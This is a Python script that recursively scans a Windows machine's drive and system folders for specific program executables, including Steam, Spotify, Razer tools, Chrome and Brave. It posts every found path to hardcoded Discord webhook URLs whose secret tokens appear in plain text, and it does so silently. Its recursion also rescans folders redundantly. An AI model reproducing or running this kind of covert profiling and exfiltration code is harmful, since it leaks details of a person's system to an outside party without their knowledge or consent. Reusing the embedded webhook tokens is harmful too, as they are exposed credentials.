import os
import requests
import datetime
import traceback

# Define webhooks
webhooks = {
    'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
    'error': 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz'
}

specific_files = [
    'steam.exe',
    'Spotify.exe',
    'RazerCortex.exe',
    'RazerSynapse.exe',
    'lghub.exe',
    'chrome.exe',
    'TikTokLIVEStudio.exe',
    'voicemeeterpro.exe',
    'brave.exe'
]

def send_webhook(url, content):
    try:
        response = requests.post(url, json={"content": content})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send webhook: {e}")

def scan_directory(directory, found_files):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                if file in specific_files:
                    found_files.append(filepath)
                    send_webhook(webhooks['process_traces'], f"Found {file} in {filepath}")
            for dir in dirs:
                scan_directory(os.path.join(root, dir), found_files)
    except Exception as e:
        print(f"Error scanning directory {directory}: {e}")

def main():
    start_time = datetime.datetime.now()
    found_files = []

    directories_to_scan = [
        'C:\\',
        os.path.expandvars(r'%APPDATA%'),
        os.path.expandvars(r'%LOCALAPPDATA%'),
        os.path.expandvars(r'%ProgramFiles%'),
        os.path.expandvars(r'%ProgramFiles(x86)%'),
        os.path.expandvars(r'%SystemRoot%\\System32'),
        os.path.expandvars(r'%SystemRoot%\\SysWOW64')
    ]

    for directory in directories_to_scan:
        scan_directory(directory, found_files)

    # Reporting
    if not found_files:
        send_webhook(webhooks['process_traces'], "No target processes found.")
    else:
        send_webhook(webhooks['process_traces'], f"Found traces: {', '.join(found_files)}")

    # Logging results
    with open('results.txt', 'w') as f:
        if found_files:
            f.write(f"Found traces:\n{', '.join(found_files)}\n")
        else:
            f.write("No target processes found.\n")
    
    end_time = datetime.datetime.now()
    duration = end_time - start_time

    # Error handling
    try:
        if found_files:
            send_webhook(webhooks['process_traces'], "Scanning complete. Check results.txt for details.")
        else:
            send_webhook(webhooks['process_traces'], "Scanning complete. No traces found. Check results.txt for details.")
    except Exception as e:
        send_webhook(webhooks['error'], f"Error occurred: {e}")
        with open('error_log.txt', 'w') as f:
            f.write(f"Error occurred: {e}\n")

if __name__ == "__main__":
    main()
